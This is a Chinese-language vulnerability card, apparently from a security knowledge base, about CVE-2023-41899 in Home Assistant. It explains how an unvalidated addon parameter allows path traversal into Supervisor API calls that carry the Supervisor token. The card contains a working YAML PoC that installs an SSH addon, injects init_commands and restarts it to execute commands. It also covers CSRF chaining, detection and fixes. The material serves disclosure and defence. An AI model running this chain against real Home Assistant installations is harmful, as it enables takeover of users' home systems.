---
id: web-generic-ssrf-hassio-addon-stdin-path-traversal-supervisor
title: hassio.addon_stdin 的 addon 参数未校验：路径穿越改写 Supervisor API 路径，借其 Bearer 令牌调用任意端点并注入 addon 命令
type: scenario
domain: web
path: web/generic/ssrf
technique: hassio-addon-stdin-path-traversal-supervisor-ssrf
tags:
- web
- ssrf
- path-traversal
- internal-api
- supervisor
- rce
- home-assistant
- iot
cve:
- CVE-2023-41899
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: 2023.9 之前（原文：修复在 2023.9 版本中发布；CVE-2023-41899）
verification:
  verified_by: verifier-V543
  verified_at: '2026-11-11T20:33:28+08:00'
  notes: 已对照原文第十二节与图13核对：MAP_SERVICE_API 将 hassio.addon_stdin 映射为 /addons/{addon}/stdin，addon 未校验直接 format 进 send_command 的 URL 且携带 SUPERVISOR_TOKEN；PoC 用 ../store/addons/<slug>/install? 与 ? 截断 /stdin，再 options/restart 注入 init_commands，与图13快捷方式一致（图内为 touch /tmp/pwned-ha）；CVE-2023-41899、修复 2023.9（原文时间线2023-09-06），affected_versions 正确。路径穿越+内部高权 API 属同一链，原子。注：原文称文件创建在 Core 容器，按截图 init_commands 属 SSH addon 配置，卡内写 addon 容器更符合机制，不影响结论。未执行 PoC。
url: /docs/web/generic/ssrf/web-generic-ssrf-hassio-addon-stdin-path-traversal-supervisor/
draft: false
kb_aliases:
- Home Assistant Supervisor SSRF
- addon_stdin 路径注入
- 内部 API 路径穿越
- Supervisor token 滥用
- CVE-2023-41899
- hassio 服务调用
---

## 一句话结论

Home Assistant Core 的 `hassio.addon_stdin` 服务把调用方提供的 `addon` 原样格式化进 Supervisor API 路径 `/addons/{addon}/stdin`，再用带 `SUPERVISOR_TOKEN` 的 HTTP 客户端发送 POST；攻击者（已认证或经 CSRF 链）传入 `addon=../store/addons/<slug>/install?` 即可穿越到任意 Supervisor 端点，并用 `?` 丢弃 `/stdin` 后缀，进而安装/配置 addon，在其 `init_commands` 注入命令实现 RCE。

## 原理

- Core 的 hassio 集成通过 `MAP_SERVICE_API` 把服务名映射为 Supervisor API 路径，例如 `hassio.addon_stdin` → `/addons/{addon}/stdin`；服务数据中的 `addon` 直接用于 `api_endpoint.command.format(addon=addon, slug=slug)`，没有格式/白名单校验。
- `send_command` 用 `f"http://{self._ip}{command}"` 拼接 URL，并附带 `Authorization: Bearer $SUPERVISOR_TOKEN` 发起 POST。Core 与 Supervisor 之间的信任是“请求来自 Core 即获授权”，令牌会随请求发送到任何被拼出来的路径。
- 攻击者控制 `addon` 字段即可控制 URL 的路径部分：`../` 做路径穿越，末尾 `?` 开启查询串，把模板追加的 `/stdin` 变成查询参数而非路径，于是实际请求变成 `http://supervisor/store/addons/<slug>/install?/stdin` 之类的任意 Supervisor 端点。
- POST 的 JSON body 来自服务数据的 `input` 字段，因此攻击者同时控制路径与请求体；配合 Supervisor 的 `/store/addons/<slug>/install`、`/addons/<slug>/options`、`/addons/<slug>/restart` 等端点，可以安装 addon、修改其配置（如 `init_commands`）、重启使其执行命令。
- 之所以成立：服务处理器把用户输入当成内部 API 路径的一部分，而内部 API 客户端自带高权限令牌；路径穿越把“只能向 addon 的 stdin 发数据”扩大为“以 Supervisor 权限调用任意 API”。
- 触发前提是该服务可被调用：攻击者持有有效令牌，或借助客户端请求伪造（如 iOS/macOS 通用链接 CVE-2023-44385）诱导已登录用户发起调用。原文即用四个连续的 `call_service` 完成利用。

## 触发条件

- Home Assistant Core 版本受影响（2023.9 之前）。
- 攻击者可调用 `hassio.addon_stdin` 服务：持有有效 access_token，或能通过 CSRF/URL 动作诱导已登录用户执行。
- Core 能访问 Supervisor API，且 `SUPERVISOR_TOKEN` 权限足够管理 addon。
- 目标 addon slug 已知（如官方 SSH addon `a0d7b954_ssh`）。
- 目标 addon 的配置允许 `init_commands` 等可执行命令的选项，或攻击者可安装可控 addon。

## 利用步骤

1. 确认可调用服务：`service: hassio.addon_stdin`，数据中包含 `addon` 与 `input`。
2. 用路径穿越 + `?` 截断构造 Supervisor 端点：`addon: "../store/addons/<slug>/install?"`，`input: {}`，安装目标 addon。
3. 修改 addon 选项：`addon: "<slug>/options?"`，`input: {"options": {"init_commands": ["touch /tmp/pwned", "id"]}}`。
4. 重启 addon 使配置生效：`addon: "<slug>/restart?"`，`input: {}`。
5. 若 addon 具备高权限（SSH/特权容器），命令在 addon 容器/主机侧执行，可进一步读取凭据、控制设备或横向。
6. 通过 CSRF 触发时，把上述调用编排进恶意快捷方式/链接，诱导受害者一次执行。

## PoC

```yaml
# 1) 路径穿越到 addon 安装端点（? 丢弃追加的 /stdin）
service: hassio.addon_stdin
data:
  addon: "../store/addons/a0d7b954_ssh/install?"
  input: {}

# 2) 修改 addon 选项，注入 init_commands
service: hassio.addon_stdin
data:
  addon: "a0d7b954_ssh/options?"
  input:
    options:
      init_commands:
        - "touch /tmp/pwned-ha"
        - "id > /tmp/pwned-id"
      packages: []
      share_sessions: false
      zsh: true

# 3) 重启 addon 触发 init_commands
service: hassio.addon_stdin
data:
  addon: "a0d7b954_ssh/restart?"
  input: {}
```

```text
# 预期：Supervisor 依次收到 /store/addons/<slug>/install、/addons/<slug>/options、
# /addons/<slug>/restart 请求（均带 SUPERVISOR_TOKEN），init_commands 在 addon 容器执行。
```

## 变体与关联

- 变体：其他 `MAP_SERVICE_API` 服务如果同样把用户字段拼进路径，也可用 `../` + `?` 改写目标端点；排查所有 `hassio.*` 服务。
- 变体：路径穿越也可用于访问 Supervisor 的其他管理端点（网络、主机、备份、Docker），影响从 RCE 扩展到宿主控制。
- 变体：`addon` 中包含 URL 编码/双重编码、`..%2f`、分号等，取决于 HTTP 客户端与 Supervisor 的归一化。
- 关联：[[mobile-ios-url-scheme-universal-link-service-csrf]]（通过 URL 动作诱导调用本服务）、[[web-generic-ssrf-*]] 系列（内部 API/云元数据 SSRF）、[[web-generic-rce-*]]（路径穿越拼接导致的命令执行）。
- 边界：服务处理器对 addon 做白名单/正则、URL 编码或使用路径参数 API、Supervisor 令牌最小权限、服务调用需要管理员角色时，本场景不成立或影响受限。

## 检测与防御

- 检测：`hassio.*` 服务调用中出现 `../`、`?`、`#`、编码的路径分隔符；Supervisor 日志出现非预期端点请求（store/addons、options、restart）；addon 安装/选项/重启的异常连续调用；Core 到 Supervisor 的请求路径与预期不符。
- 修复：对 `addon` 做严格白名单/正则校验（仅允许已知 slug），使用 URL 编码或路径参数拼接，禁止用户输入参与 URL 路径；升级到修复版本（2023.9+）。
- 加固：Supervisor 令牌最小权限与短时效；对内部 API 调用做路径白名单；限制服务调用角色；对 `call_service` 来源做审计（尤其 CSRF/URL 动作触发的调用）；监控 addon 配置变更与 `init_commands`。
